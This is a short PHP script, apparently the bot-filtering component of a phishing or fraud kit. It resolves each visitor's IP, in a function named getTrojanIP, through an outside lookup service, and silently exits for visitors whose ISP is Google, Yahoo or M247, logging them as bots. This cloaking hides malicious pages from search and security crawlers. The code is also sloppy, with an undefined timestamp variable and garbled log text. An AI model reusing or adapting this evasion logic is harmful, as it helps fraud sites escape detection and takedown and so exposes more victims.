<?php
	
	@session_start();

	$forceSSL = 1;
	$redirected = false;

	$protocol = stripos($_SERVER['SERVER_PROTOCOL'],'https') === 0 ? 'https://' : 'http://';
	$actual_link = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

	if ($protocol=="http://" && $forceSSL && !isset($_SESSION['redirected'])) {
		$_SESSION['redirected'] = 1;
		header("Location: https://$actual_link");
	}

	function getTrojanIP()
	{
	    // Get real visitor IP behind CloudFlare network
	    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
	              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	    }
	    $client  = @$_SERVER['HTTP_CLIENT_IP'];
	    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	    $remote  = $_SERVER['REMOTE_ADDR'];

	    if(filter_var($client, FILTER_VALIDATE_IP))
	    {
	        $ip = $client;
	    }
	    elseif(filter_var($forward, FILTER_VALIDATE_IP))
	    {
	        $ip = $forward;
	    }
	    else
	    {
	        $ip = $remote;
	    }

	    return $ip;
	}

	@$ip = getTrojanIP();
	$ch = curl_init("http://extreme-ip-lookup.com/json/$ip");
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
	$result = curl_exec($ch);
	$result = json_decode($result);
	@$city = $result->city;
	@$isp = $result->isp;

	if(strpos($isp, "Google") !== false || strpos($isp, "Yahoo") !== false || strpos($isp, "M247") !== false){
	    $file = fopen("bots.log", "a");
	    fwrite($file, "$isp [$ip] BOT DETECTED!\nRedirected to google.com\n[$timestamp]");
	    fclose($file);
	    exit;
	}else{
$file = fopen("bots.log", "a");
	    @fwrite($file, "$isp [$ip] BOT DETECTED!\nRedirected to gasdsadcom\n[$timestamp]");
	    fclose($file);
	}

?>